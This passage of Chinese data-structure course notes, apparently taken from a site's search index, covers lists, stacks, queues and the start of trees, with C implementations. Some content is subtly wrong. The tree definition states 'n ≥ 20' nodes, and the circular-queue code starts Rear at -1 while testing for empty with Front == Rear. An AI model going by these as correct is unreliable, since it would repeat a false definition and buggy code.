*Glist;\nstruct GNode{\n    int Tag;    /* \u6807\u5fd7\u57df\uff0c0\u8868\u793a\u8282\u70b9\u662f\u5355\u5143\u7d20\uff0c1\u8868\u793a\u662f\u5e7f\u4e49\u8868*/\n    union{      /* \u5b50\u8868\u6307\u9488\u57dfSublist\u4e0e\u5355\u5143\u7d20\u6570\u636e\u57dfData\u590d\u7528\uff0c\u5373\u5171\u7528\u5b58\u50a8\u7a7a\u95f4*/\n        ElementType Data;\n        GList SubList;\n    }URegion;\n    GList Next; /* \u6307\u5411\u540e\u7ee7\u8282\u70b9 */\n}\n</code></pre>"}, {"location": "Course/FDS/Lec02/#_7", "title": "\u591a\u91cd\u94fe\u8868", "text": "<p>Note</p> <p>\u94fe\u8868\u4e2d\u7684\u8282\u70b9\u53ef\u80fd\u540c\u65f6\u96b6\u5c5e\u4e8e\u591a\u4e2a\u94fe</p> <ul> <li>\u591a\u91cd\u94fe\u8868\u4e2d\u8282\u70b9\u7684\u6307\u9488\u57df\u4f1a\u6709\u591a\u4e2a\uff0c\u5982\u524d\u9762\u7684\u4f8b\u5b50\u5305\u542b\u4e86 Next \u548c Sublist \u4e24\u4e2a\u6307\u9488\u57df\uff1b</li> <li>\u4f46\u5305\u542b\u4e24\u4e2a\u6307\u9488\u57df\u7684\u94fe\u8868\u5e76\u4e0d\u4e00\u5b9a\u662f\u591a\u91cd\u94fe\u8868\uff0c\u6bd4\u5982\u53cc\u5411\u94fe\u8868</li> </ul> <p>Note</p> <ul> <li>\u7528\u4e00\u4e2a\u6807\u8bc6\u57df Tag \u6765\u533a\u5206\u5934\u8282\u70b9\u548c\u975e 0 \u5143\u7d20\u8282\u70b9:</li> <li>\u5934\u8282\u70b9\u7684\u6807\u8bc6\u503c\u4e3a \u201cHead\u201d \uff0c\u77e9\u9635\u975e 0 \u5143\u7d20\u8282\u70b9\u7684\u6807\u8bc6\u503c\u4e3a \u201cTerm\u201d </li> </ul> <p></p> \u7ebf\u6027\u8868\u7684\u5b9a\u4e49\u4e0e\u64cd\u4f5c-\u987a\u5e8f\u8868 <pre><code>typedef int Position;\ntypedef struct LNode *List;\nstruct LNode {\n    ElementType Data[MAXSIZE];\n    Position Last;\n};\n/* \u521d\u59cb\u5316 */\nList MakeEmpty()\n{\n    List L;\n\n    L = (List)malloc(sizeof(struct LNode));\n    L-&gt;Last = -1;\n\n    return L;\n}\n/* \u67e5\u627e */\n#define ERROR -1\n\nPosition Find( List L, ElementType X )\n{\n    Position i = 0;\n\n    while( i &lt;= L-&gt;Last &amp;&amp; L-&gt;Data[i]!= X )\n        i++;\n    if ( i &gt; L-&gt;Last )  return ERROR; /* \u5982\u679c\u6ca1\u627e\u5230\uff0c\u8fd4\u56de\u9519\u8bef\u4fe1\u606f */\n    else  return i;  /* \u627e\u5230\u540e\u8fd4\u56de\u7684\u662f\u5b58\u50a8\u4f4d\u7f6e */\n}\n/* \u63d2\u5165 */\n/*\u6ce8\u610f:\u5728\u63d2\u5165\u4f4d\u7f6e\u53c2\u6570P\u4e0a\u4e0e\u8bfe\u7a0b\u89c6\u9891\u6709\u6240\u4e0d\u540c\uff0c\u8bfe\u7a0b\u89c6\u9891\u4e2di\u662f\u5e8f\u5217\u4f4d\u5e8f\uff08\u4ece1\u5f00\u59cb\uff09\uff0c\u8fd9\u91ccP\u662f\u5b58\u50a8\u4e0b\u6807\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u4e24\u8005\u5dee1*/\nbool Insert( List L, ElementType X, Position P ) \n{ /* \u5728L\u7684\u6307\u5b9a\u4f4d\u7f6eP\u524d\u63d2\u5165\u4e00\u4e2a\u65b0\u5143\u7d20X */\n    Position i;\n\n    if ( L-&gt;Last == MAXSIZE-1) {\n        /* \u8868\u7a7a\u95f4\u5df2\u6ee1\uff0c\u4e0d\u80fd\u63d2\u5165 */\n        printf(\"\u8868\u6ee1\"); \n        return false; \n    }  \n    if ( P&lt;0 || P&gt;L-&gt;Last+1 ) { /* \u68c0\u67e5\u63d2\u5165\u4f4d\u7f6e\u7684\u5408\u6cd5\u6027 */\n        printf(\"\u4f4d\u7f6e\u4e0d\u5408\u6cd5\");\n        return false; \n    } \n    for( i=L-&gt;Last; i&gt;=P; i-- )\n        L-&gt;Data[i+1] = L-&gt;Data[i]; /* \u5c06\u4f4d\u7f6eP\u53ca\u4ee5\u540e\u7684\u5143\u7d20\u987a\u5e8f\u5411\u540e\u79fb\u52a8 */\n    L-&gt;Data[P] = X;  /* \u65b0\u5143\u7d20\u63d2\u5165 */\n    L-&gt;Last++;       /* Last\u4ecd\u6307\u5411\u6700\u540e\u5143\u7d20 */\n    return true; \n} \n/* \u5220\u9664 */\n/*\u6ce8\u610f:\u5728\u5220\u9664\u4f4d\u7f6e\u53c2\u6570P\u4e0a\u4e0e\u8bfe\u7a0b\u89c6\u9891\u6709\u6240\u4e0d\u540c\uff0c\u8bfe\u7a0b\u89c6\u9891\u4e2di\u662f\u5e8f\u5217\u4f4d\u5e8f\uff08\u4ece1\u5f00\u59cb\uff09\uff0c\u8fd9\u91ccP\u662f\u5b58\u50a8\u4e0b\u6807\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u4e24\u8005\u5dee1*/\nbool Delete( List L, Position P )\n{ /* \u4eceL\u4e2d\u5220\u9664\u6307\u5b9a\u4f4d\u7f6eP\u7684\u5143\u7d20 */\n    Position i;\n\n    if( P&lt;0 || P&gt;L-&gt;Last ) { /* \u68c0\u67e5\u7a7a\u8868\u53ca\u5220\u9664\u4f4d\u7f6e\u7684\u5408\u6cd5\u6027 */\n        printf(\"\u4f4d\u7f6e%d\u4e0d\u5b58\u5728\u5143\u7d20\", P ); \n        return false; \n    }\n    for( i=P+1; i&lt;=L-&gt;Last; i++ )\n        L-&gt;Data[i-1] = L-&gt;Data[i]; /* \u5c06\u4f4d\u7f6eP+1\u53ca\u4ee5\u540e\u7684\u5143\u7d20\u987a\u5e8f\u5411\u524d\u79fb\u52a8 */\n    L-&gt;Last--; /* Last\u4ecd\u6307\u5411\u6700\u540e\u5143\u7d20 */\n    return true;   \n}\n</code></pre> \u7ebf\u6027\u8868\u7684\u5b9a\u4e49\u4e0e\u64cd\u4f5c-\u94fe\u5f0f\u8868 <pre><code>typedef struct LNode *PtrToLNode;\nstruct LNode {\n    ElementType Data;\n    PtrToLNode Next;\n};\ntypedef PtrToLNode Position;\ntypedef PtrToLNode List;\n\n/* \u67e5\u627e */\n#define ERROR NULL\n\nPosition Find( List L, ElementType X )\n{\n    Position p = L; /* p\u6307\u5411L\u7684\u7b2c1\u4e2a\u8282\u70b9 */\n\n    while ( p &amp;&amp; p-&gt;Data!=X )\n        p = p-&gt;Next;\n\n    /* \u4e0b\u5217\u8bed\u53e5\u53ef\u4ee5\u7528 return p; \u66ff\u6362 */\n    if ( p )\n        return p;\n    else\n        return ERROR;\n}\n\n/* \u5e26\u5934\u8282\u70b9\u7684\u63d2\u5165 */\n/*\u6ce8\u610f:\u5728\u63d2\u5165\u4f4d\u7f6e\u53c2\u6570P\u4e0a\u4e0e\u8bfe\u7a0b\u89c6\u9891\u6709\u6240\u4e0d\u540c\uff0c\u8bfe\u7a0b\u89c6\u9891\u4e2di\u662f\u5e8f\u5217\u4f4d\u5e8f\uff08\u4ece1\u5f00\u59cb\uff09\uff0c\u8fd9\u91ccP\u662f\u94fe\u8868\u8282\u70b9\u6307\u9488\uff0c\u5728P\u4e4b\u524d\u63d2\u5165\u65b0\u8282\u70b9 */\nbool Insert( List L, ElementType X, Position P )\n{ /* \u8fd9\u91cc\u9ed8\u8ba4L\u6709\u5934\u8282\u70b9 */\n    Position tmp, pre;\n\n    /* \u67e5\u627eP\u7684\u524d\u4e00\u4e2a\u8282\u70b9 */        \n    for ( pre=L; pre&amp;&amp;pre-&gt;Next!=P; pre=pre-&gt;Next ) ;            \n    if ( pre==NULL ) { /* P\u6240\u6307\u7684\u8282\u70b9\u4e0d\u5728L\u4e2d */\n        printf(\"\u63d2\u5165\u4f4d\u7f6e\u53c2\u6570\u9519\u8bef\\n\");\n        return false;\n    }\n    else { /* \u627e\u5230\u4e86P\u7684\u524d\u4e00\u4e2a\u8282\u70b9pre */\n        /* \u5728P\u524d\u63d2\u5165\u65b0\u8282\u70b9 */\n        tmp = (Position)malloc(sizeof(struct LNode)); /* \u7533\u8bf7\u3001\u586b\u88c5\u8282\u70b9 */\n        tmp-&gt;Data = X; \n        tmp-&gt;Next = P;\n        pre-&gt;Next = tmp;\n        return true;\n    }\n}\n\n/* \u5e26\u5934\u8282\u70b9\u7684\u5220\u9664 */\n/*\u6ce8\u610f:\u5728\u5220\u9664\u4f4d\u7f6e\u53c2\u6570P\u4e0a\u4e0e\u8bfe\u7a0b\u89c6\u9891\u6709\u6240\u4e0d\u540c\uff0c\u8bfe\u7a0b\u89c6\u9891\u4e2di\u662f\u5e8f\u5217\u4f4d\u5e8f\uff08\u4ece1\u5f00\u59cb\uff09\uff0c\u8fd9\u91ccP\u662f\u62df\u5220\u9664\u8282\u70b9\u6307\u9488 */\nbool Delete( List L, Position P )\n{ /* \u8fd9\u91cc\u9ed8\u8ba4L\u6709\u5934\u8282\u70b9 */\n    Position pre;\n\n    /* \u67e5\u627eP\u7684\u524d\u4e00\u4e2a\u8282\u70b9 */        \n    for ( pre=L; pre&amp;&amp;pre-&gt;Next!=P; pre=pre-&gt;Next ) ;            \n    if ( pre==NULL || P==NULL) { /* P\u6240\u6307\u7684\u8282\u70b9\u4e0d\u5728L\u4e2d */\n        printf(\"\u5220\u9664\u4f4d\u7f6e\u53c2\u6570\u9519\u8bef\\n\");\n        return false;\n    }\n    else { /* \u627e\u5230\u4e86P\u7684\u524d\u4e00\u4e2a\u8282\u70b9pre */\n        /* \u5c06P\u4f4d\u7f6e\u7684\u8282\u70b9\u5220\u9664 */\n        pre-&gt;Next = P-&gt;Next;\n        free(P);\n        return true;\n    }\n}\n</code></pre>"}, {"location": "Course/FDS/Lec02/#stacks", "title": "\u6808 | Stacks", "text": ""}, {"location": "Course/FDS/Lec02/#_8", "title": "\u5806\u6808\u7684\u62bd\u8c61\u6570\u636e\u7c7b\u578b\u63cf\u8ff0", "text": "<ul> <li>\u7c7b\u578b\u540d\u79f0 : \u5806\u6808 (Stack)</li> <li>\u6570\u636e\u5bf9\u8c61\u96c6 : \u4e00\u4e2a\u6709 0 \u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u7684\u6709\u7a77\u7ebf\u6027\u8868</li> <li>\u64cd\u4f5c\u96c6 : \u957f\u5ea6\u4e3a MaxSize \u7684\u5806\u6808 S \\(\\in\\) Stack \uff0c\u5806\u6808\u5143\u7d20 item \\(\\in\\) ElementType</li> </ul> <p>Note</p> <ol> <li>Stack CreateStack( int MaxSize ): \u751f\u6210\u7a7a\u5806\u6808\uff0c\u5176\u6700\u5927\u957f\u5ea6\u4e3a MaxSize</li> <li>int IsFull( Stack S, int MaxSize ): \u5224\u65ad\u5806\u6808 S \u662f\u5426\u5df2\u6ee1</li> <li>void Push( Stack S, ElementType item ): \u5c06\u5143\u7d20 item \u538b\u5165\u5806\u6808</li> <li>int IsEmpty( Stack S ): \u5224\u65ad\u5806\u6808 S \u662f\u5426\u4e3a\u7a7a</li> <li>ElementType Pop( Stack S ): \u5220\u9664\u5e76\u8fd4\u56de\u6808\u9876\u5143\u7d20</li> </ol>"}, {"location": "Course/FDS/Lec02/#_9", "title": "\u6808\u7684\u987a\u5e8f\u5b58\u50a8\u5b9e\u73b0", "text": "<ul> <li>\u6808\u7684\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\u901a\u5e38\u7531\u4e00\u4e2a\u4e00\u7ef4\u6570\u7ec4\u548c\u4e00\u4e2a\u8bb0\u5f55\u6808\u9876\u5143\u7d20\u4f4d\u7f6e\u7684\u53d8\u91cf\u7ec4\u6210</li> </ul> \u5806\u6808\u7684\u5b9a\u4e49\u4e0e\u64cd\u4f5c-\u987a\u5e8f\u5b58\u50a8 <pre><code>typedef int Position;\nstruct SNode {\n    ElementType *Data; /* \u5b58\u50a8\u5143\u7d20\u7684\u6570\u7ec4 */\n    Position Top;      /* \u6808\u9876\u6307\u9488 */\n    int MaxSize;       /* \u5806\u6808\u6700\u5927\u5bb9\u91cf */\n};\ntypedef struct SNode *Stack;\n\nStack CreateStack( int MaxSize )\n{\n    Stack S = (Stack)malloc(sizeof(struct SNode));\n    S-&gt;Data = (ElementType *)malloc(MaxSize * sizeof(ElementType));\n    S-&gt;Top = -1;\n    S-&gt;MaxSize = MaxSize;\n    return S;\n}\n\nbool IsFull( Stack S )\n{\n    return (S-&gt;Top == S-&gt;MaxSize-1);\n}\n\nbool Push( Stack S, ElementType X )\n{\n    if ( IsFull(S) ) {\n        printf(\"\u5806\u6808\u6ee1\");\n        return false;\n    }\n    else {\n        S-&gt;Data[++(S-&gt;Top)] = X;\n        return true;\n    }\n}\n\nbool IsEmpty( Stack S )\n{\n    return (S-&gt;Top == -1);\n}\n\nElementType Pop( Stack S )\n{\n    if ( IsEmpty(S) ) {\n        printf(\"\u5806\u6808\u7a7a\");\n        return ERROR; /* ERROR\u662fElementType\u7684\u7279\u6b8a\u503c\uff0c\u6807\u5fd7\u9519\u8bef */\n    }\n    else \n        return ( S-&gt;Data[(S-&gt;Top)--] );\n}\n</code></pre>"}, {"location": "Course/FDS/Lec02/#_10", "title": "\u5806\u6808\u7684\u94fe\u5f0f\u5b58\u50a8\u5b9e\u73b0", "text": "<ul> <li>\u6808\u7684\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u5b9e\u9645\u4e0a\u5c31\u662f\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u53eb\u505a\u94fe\u6808\u3002\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\u53ea\u80fd\u5728\u94fe\u6808\u7684\u6808\u9876\u8fdb\u884c</li> </ul> <p>\u7528\u94fe\u8868\u7684\u5934\u505a\u6808\u7684 Top \uff0c\u5355\u5411\u94fe\u8868\u7684\u94fe\u5c3e\u4e0d\u53ef\u505a Top</p> \u5806\u6808\u7684\u5b9a\u4e49\u4e0e\u64cd\u4f5c-\u94fe\u5f0f\u5b58\u50a8 <pre><code>typedef struct SNode *PtrToSNode;\nstruct SNode {\n    ElementType Data;\n    PtrToSNode Next;\n};\ntypedef PtrToSNode Stack;\n\nStack CreateStack( ) \n{ /* \u6784\u5efa\u4e00\u4e2a\u5806\u6808\u7684\u5934\u8282\u70b9\uff0c\u8fd4\u56de\u8be5\u8282\u70b9\u6307\u9488 */\n    Stack S;\n\n    S = (Stack)malloc(sizeof(struct SNode));\n    S-&gt;Next = NULL;\n    return S;\n}\n\nbool IsEmpty ( Stack S )\n{ /* \u5224\u65ad\u5806\u6808S\u662f\u5426\u4e3a\u7a7a\uff0c\u82e5\u662f\u8fd4\u56detrue\uff1b\u5426\u5219\u8fd4\u56defalse */\n    return ( S-&gt;Next == NULL );\n}\n\nbool Push( Stack S, ElementType X )\n{ /* \u5c06\u5143\u7d20X\u538b\u5165\u5806\u6808S */\n    PtrToSNode TmpCell;\n\n    TmpCell = (PtrToSNode)malloc(sizeof(struct SNode));\n    TmpCell-&gt;Data = X;\n    TmpCell-&gt;Next = S-&gt;Next;\n    S-&gt;Next = TmpCell;\n    return true;\n}\n\nElementType Pop( Stack S )  \n{ /* \u5220\u9664\u5e76\u8fd4\u56de\u5806\u6808S\u7684\u6808\u9876\u5143\u7d20 */\n    PtrToSNode FirstCell;\n    ElementType TopElem;\n\n    if( IsEmpty(S) ) {\n        printf(\"\u5806\u6808\u7a7a\"); \n        return ERROR;\n    }\n    else {\n        FirstCell = S-&gt;Next; \n        TopElem = FirstCell-&gt;Data;\n        S-&gt;Next = FirstCell-&gt;Next;\n        free(FirstCell);\n        return TopElem;\n    }\n}\n</code></pre>"}, {"location": "Course/FDS/Lec02/#_11", "title": "\u5806\u6808\u5e94\u7528\uff1a\u8868\u8fbe\u5f0f\u6c42\u503c", "text": ""}, {"location": "Course/FDS/Lec02/#_12", "title": "\u4e2d\u7f00\u8868\u8fbe\u5f0f\u6c42\u503c", "text": "<p>\u57fa\u672c\u7b56\u7565 \uff1a \u5c06\u4e2d\u7f00\u8868\u8fbe\u5f0f\u8f6c\u6362\u4e3a\u9006\u6ce2\u5170\u8868\u8fbe\u5f0f (\u540e\u7f00\u8868\u8fbe\u5f0f) \uff0c\u7136\u540e\u6c42\u503c</p>"}, {"location": "Course/FDS/Lec02/#_13", "title": "\u4e2d\u7f00\u8868\u8fbe\u5f0f\u5982\u4f55\u8f6c\u6362\u4e3a\u9006\u6ce2\u5170\u8868\u8fbe\u5f0f", "text": "<p>\u4ece\u5934\u5230\u5c3e\u8bfb\u53d6\u4e2d\u7f00\u8868\u8fbe\u5f0f\u7684\u6bcf\u4e2a\u5bf9\u8c61\uff0c\u5bf9\u4e0d\u540c\u5bf9\u8c61\u6309\u4e0d\u540c\u60c5\u51b5\u5904\u7406</p> <ol> <li>\u8fd0\u7b97\u6570\uff1a\u76f4\u63a5\u8f93\u51fa</li> <li>\u5de6\u62ec\u53f7\uff1a\u538b\u5165\u5806\u6808</li> <li>\u53f3\u62ec\u53f7\uff1a\u5c06\u6808\u9876\u7684\u8fd0\u7b97\u7b26\u5f39\u51fa\u5e76\u8f93\u51fa\uff0c\u76f4\u5230\u9047\u5230\u5de6\u62ec\u53f7\uff08\u51fa\u6808\uff0c\u4e0d\u8f93\u51fa\uff09\uff1b</li> <li>\u8fd0\u7b97\u7b26<ol> <li>\u82e5\u4f18\u5148\u7ea7\u5927\u4e8e\u6808\u9876\u8fd0\u7b97\u7b26\uff0c\u5219\u628a\u5b83\u5165\u6808</li> <li>\u82e5\u5c0f\u4e8e\u7b49\u4e8e\uff0c\u5219\u5c06\u6808\u9876\u8fd0\u7b97\u7b26\u5f39\u51fa\u5e76\u8f93\u51fa\uff1b\u518d\u6bd4\u8f83\u65b0\u7684\u6808\u9876\u8fd0\u7b97\u7b26\uff0c\u76f4\u5230\u8be5\u8fd0\u7b97\u7b26\u5927\u4e8e\u6808\u9876\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7\u4e3a\u6b62\uff0c\u7136\u540e\u5c06\u8be5\u8fd0\u7b97\u7b26\u5165\u6808</li> </ol> </li> <li>\u82e5\u5404\u5bf9\u8c61\u5904\u7406\u5b8c\u6bd5\uff0c\u5219\u5c06\u5806\u6808\u4e2d\u5b58\u7559\u7684\u8fd0\u7b97\u7b26\u4e00\u5e76\u8f93\u51fa</li> </ol>"}, {"location": "Course/FDS/Lec02/#queues", "title": "\u961f\u5217 | Queues", "text": "<p>Abstract</p> <p>\u961f\u5217\uff1a\u5177\u6709\u4e00\u5b9a\u64cd\u4f5c\u7ea6\u675f\u7684\u7ebf\u6027\u8868 (\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\uff1a\u53ea\u80fd\u5728\u4e00\u6bb5\u63d2\u5165\uff0c\u800c\u5728\u53e6\u4e00\u7aef\u5220\u9664) 1. \u6570\u636e\u63d2\u5165\uff1a\u5165\u961f\u5217 2. \u6570\u636e\u5220\u9664\uff1a\u51fa\u961f\u5217 3. \u5148\u6765\u5148\u670d\u52a1 4. \u5148\u8fdb\u5148\u51fa</p>"}, {"location": "Course/FDS/Lec02/#_14", "title": "\u961f\u5217\u7684\u62bd\u8c61\u6570\u636e\u7c7b\u578b\u63cf\u8ff0", "text": "<ul> <li>\u7c7b\u578b\u540d\u79f0 : \u961f\u5217 (Queue)</li> <li>\u6570\u636e\u5bf9\u8c61\u96c6 : \u4e00\u4e2a\u6709 0 \u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u7684\u6709\u7a77\u7ebf\u6027\u8868</li> <li>\u64cd\u4f5c\u96c6 : \u957f\u5ea6\u4e3a MaxSize \u7684\u961f\u5217 Q \\(\\in\\) Queue \uff0c\u961f\u5217\u5143\u7d20 item \\(\\in\\) ElementType</li> </ul> <p>Note</p> <ol> <li>Queue CreateQueue( int MaxSize ): \u751f\u6210\u957f\u5ea6\u4e3a MaxSize \u7684\u7a7a\u961f\u5217</li> <li>int IsFullQ( Queue Q, int MaxSize ): \u5224\u65ad\u961f\u5217 Q \u662f\u5426\u5df2\u6ee1</li> <li>void AddQ( Queue Q, ElementType item ): \u5c06\u6570\u636e\u5143\u7d20 item \u63d2\u5165\u961f\u5217Q \u4e2d</li> <li>int IsEmptyQ( Queue Q ): \u5224\u65ad\u961f\u5217 Q \u662f\u5426\u4e3a\u7a7a</li> <li>ElementType DeleteQ( Queue Q ): \u5c06\u961f\u5934\u6570\u636e\u5143\u7d20\u4ece\u961f\u5217\u4e2d\u5220\u9664\u5e76\u8fd4\u56de</li> </ol>"}, {"location": "Course/FDS/Lec02/#_15", "title": "\u961f\u5217\u7684\u987a\u5e8f\u5b58\u50a8\u5b9e\u73b0", "text": "<ul> <li>\u961f\u5217\u7684\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\u901a\u5e38\u7528\u4e00\u4e2a\u4e00\u7ef4\u6570\u7ec4\u548c\u4e00\u4e2a\u8bb0\u5f55\u961f\u5217\u5934\u5143\u7d20\u4f4d\u7f6e\u7684\u53d8\u91cf front \u4ee5\u53ca\u4e00\u4e2a\u8bb0\u5f55\u961f\u5217\u5c3e\u5143\u7d20\u4f4d\u7f6e\u7684\u53d8\u91cf rear \u7ec4\u6210</li> </ul>"}, {"location": "Course/FDS/Lec02/#_16", "title": "\u4e00\u7ef4\u6570\u7ec4\u961f\u5217", "text": ""}, {"location": "Course/FDS/Lec02/#_17", "title": "\u987a\u73af\u961f\u5217", "text": "<p> \u5224\u65ad\u987a\u73af\u961f\u5217\u7a7a\u548c\u6ee1\u53ef\u4ee5\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6848 1. \u4f7f\u7528\u989d\u5916\u6807\u8bb0\uff1aSize \u6216\u8005 Tag \u57df 2. \u4ec5\u4f7f\u7528 n-1 \u4e2a\u6570\u7ec4\u7a7a\u95f4 (Front == Rear\u65f6\u4e3a\u7a7a)</p> \u961f\u5217\u7684\u5b9a\u4e49\u4e0e\u64cd\u4f5c-\u987a\u5e8f\u5b58\u50a8 <pre><code>typedef int Position;\nstruct QNode {\n    ElementType *Data;     /* \u5b58\u50a8\u5143\u7d20\u7684\u6570\u7ec4 */\n    Position Front, Rear;  /* \u961f\u5217\u7684\u5934\u3001\u5c3e\u6307\u9488 */\n    int MaxSize;           /* \u961f\u5217\u6700\u5927\u5bb9\u91cf */\n};\ntypedef struct QNode *Queue;\n\nQueue CreateQueue( int MaxSize )\n{\n    Queue Q = (Queue)malloc(sizeof(struct QNode));\n    Q-&gt;Data = (ElementType *)malloc(MaxSize * sizeof(ElementType));\n    Q-&gt;Front = 0;\n    Q-&gt;Rear = -1;\n    Q-&gt;MaxSize = MaxSize;\n    return Q;\n}\n\nbool IsFull( Queue Q )\n{\n    return ((Q-&gt;Rear+1) % Q-&gt;MaxSize == Q-&gt;Front);\n}\n\nbool AddQ( Queue Q, ElementType X )\n{\n    if ( IsFull(Q) ) {\n        printf(\"\u961f\u5217\u6ee1\");\n        return false;\n    }\n    else {\n        Q-&gt;Rear = (Q-&gt;Rear+1) % Q-&gt;MaxSize;\n        Q-&gt;Data[Q-&gt;Rear] = X;\n        return true;\n    }\n}\n\nbool IsEmpty( Queue Q )\n{\n    return (Q-&gt;Front == Q-&gt;Rear);\n}\n\nElementType DeleteQ( Queue Q )\n{\n    if ( IsEmpty(Q) ) { \n        printf(\"\u961f\u5217\u7a7a\");\n        return ERROR;\n    }\n    else  {\n        Q-&gt;Front =(Q-&gt;Front+1) % Q-&gt;MaxSize;\n        return  Q-&gt;Data[Q-&gt;Front];\n    }\n}\n</code></pre>"}, {"location": "Course/FDS/Lec02/#_18", "title": "\u961f\u5217\u7684\u94fe\u8868\u5b58\u50a8\u5b9e\u73b0", "text": "\u961f\u5217\u7684\u5b9a\u4e49\u4e0e\u64cd\u4f5c-\u94fe\u5f0f\u5b58\u50a8 <pre><code>typedef struct Node *PtrToNode;\nstruct Node { /* \u961f\u5217\u4e2d\u7684\u8282\u70b9 */\n    ElementType Data;\n    PtrToNode Next;\n};\ntypedef PtrToNode Position;\n\nstruct QNode {\n    Position Front, Rear;  /* \u961f\u5217\u7684\u5934\u3001\u5c3e\u6307\u9488 */\n    int MaxSize;           /* \u961f\u5217\u6700\u5927\u5bb9\u91cf */\n};\ntypedef struct QNode *Queue;\n\nbool IsEmpty( Queue Q )\n{\n    return ( Q-&gt;Front == NULL);\n}\n\nElementType DeleteQ( Queue Q )\n{\n    Position FrontCell; \n    ElementType FrontElem;\n\n    if  ( IsEmpty(Q) ) {\n        printf(\"\u961f\u5217\u7a7a\");\n        return ERROR;\n    }\n    else {\n        FrontCell = Q-&gt;Front;\n        if ( Q-&gt;Front == Q-&gt;Rear ) /* \u82e5\u961f\u5217\u53ea\u6709\u4e00\u4e2a\u5143\u7d20 */\n            Q-&gt;Front = Q-&gt;Rear = NULL; /* \u5220\u9664\u540e\u961f\u5217\u7f6e\u4e3a\u7a7a */\n        else                     \n            Q-&gt;Front = Q-&gt;Front-&gt;Next;\n        FrontElem = FrontCell-&gt;Data;\n\n        free( FrontCell );  /* \u91ca\u653e\u88ab\u5220\u9664\u8282\u70b9\u7a7a\u95f4  */\n        return  FrontElem;\n    }\n}\n</code></pre>"}, {"location": "Course/FDS/Lec03/", "title": "\u6811 | Tree", "text": "<p> \u7ea6 3108 \u4e2a\u5b57  436 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 16 \u5206\u949f</p>"}, {"location": "Course/FDS/Lec03/#_1", "title": "\u6811\u7684\u5b9a\u4e49", "text": "<ul> <li>\u6811\uff1an(n \\(\\ge\\) 20)\u4e2a\u8282\u70b9\u6784\u6210\u7684\u6709\u9650\u96c6\u5408\uff1b</li> <li>\u5f53n = 0\u65f6\uff0c\u79f0\u4e3a\u7a7a\u6811\uff1b</li> <li>\u5bf9\u4e8e\u4efb\u4e00\u68f5\u975e\u7a7a\u6811 (n \\(&gt;\\) 0) \uff0c\u5b83\u5177\u5907\u4ee5\u4e0b\u6027\u8d28\uff1a</li> <li>\u6811\u4e2d\u6709\u4e00\u4e2a\u79f0\u4e3a\u201c\u6839\u201d\u7684\u7279\u6b8a\u8282\u70b9\uff0c\u7528r\u8868\u793a\uff1b</li> <li>\u5176\u4f59\u8282\u70b9\u53ef\u5206\u4e3a m(m \\(&gt;\\) 0) \u4e2a\u4e92\u4e0d\u76f8\u4ea4\u7684\u6709\u9650\u96c6 T<sub>1</sub> , T<sub>2</sub> , \u00b7\u00b7\u00b7, T<sub>m</sub> , \u5176\u4e2d\u6bcf\u4e2a\u96c6\u5408\u672c\u8eab\u53c8\u662f\u4e00\u68f5\u6811\uff0c\u79f0\u4e3a\u539f\u6765\u6811\u7684\u201c\u5b50\u6811\u201d</li> </ul>"}, {"location": "Course/FDS/Lec03/#_2", "title": "\u4e00\u4e9b\u57fa\u672c\u672f\u8bed", "text": "<ol> <li>\u8282\u70b9\u7684\u5ea6 (Degree) : \u8282\u70b9\u7684\u5b50\u6811\u4e2a\u6570</li> <li>\u6811\u7684\u5ea6: \u6811\u7684\u6240\u6709\u8282\u70b9\u4e2d\u6700\u5927\u7684\u5ea6\u6570</li> <li>\u53f6\u8282\u70b9 (Leaf) : \u5ea6\u4e3a 0 \u7684\u8282\u70b9</li> <li>\u7236\u8282\u70b9 (Parent) : \u6709\u5b50\u6811\u7684\u8282\u70b9\u662f\u5176\u5b50\u6811\u7684\u6839\u8282\u70b9\u7684\u7236\u8282\u70b9</li> <li>\u5b50\u8282\u70b9 (Child) : \u82e5 A \u8282\u70b9\u662f B \u8282\u70b9\u7684\u7236\u8282\u70b9\uff0c\u5219\u79f0 B \u8282\u70b9\u662f A \u8282\u70b9\u7684\u5b50\u8282\u70b9 (\u5b50\u8282\u70b9\u4e5f\u79f0\u5b69\u5b50\u8282\u70b9)</li> <li>\u5144\u5f1f\u8282\u70b9 (Sibiling) : \u5177\u6709\u540c\u4e00\u7236\u8282\u70b9\u7684\u5404\u8282\u70b9\u5f7c\u6b64\u662f\u5144\u5f1f\u8282\u70b9</li> <li>\u8def\u5f84\u548c\u8def\u5f84\u957f\u5ea6\uff1a\u4ece\u8282\u70b9 n<sub>1</sub> \u5230 n<sub>k</sub> \u7684\u8def\u5f84\u4e3a\u4e00\u4e2a\u8282\u70b9\u5e8f\u5217 n<sub>1</sub> , n<sub>2</sub> ,\u00b7\u00b7\u00b7, n<sub>k</sub> , n<sub>i</sub> \u662f n<sub>i+1</sub> \u7684\u7236\u8282\u70b9\u3002\u8def\u5f84\u6240\u5305\u542b\u8fb9\u7684\u4e2a\u6570\u4e3a\u8def\u5f84\u7684\u957f\u5ea6</li> <li>\u7956\u5148\u8282\u70b9 (Ancestor) : \u6cbf\u6811\u6839\u5230\u67d0\u4e00\u8282\u70b9\u8def\u5f84\u4e0a\u7684\u6240\u6709\u8282\u70b9\u90fd\u662f\u8fd9\u4e2a\u8282\u70b9\u7684\u7956\u5148\u8282\u70b9\u3002</li> <li>\u5b50\u5b59\u8282\u70b9 (Descendant) : \u67d0\u4e00\u8282\u70b9\u7684\u5b50\u6811\u4e2d\u7684\u6240\u6709\u8282\u70b9\u662f\u8fd9\u4e2a\u8282\u70b9\u7684\u5b50\u5b59\u3002</li> <li>\u8282\u70b9\u7684\u5c42\u6b21 (Level) : \u89c4\u5b9a\u6839\u8282\u70b9\u5728 1 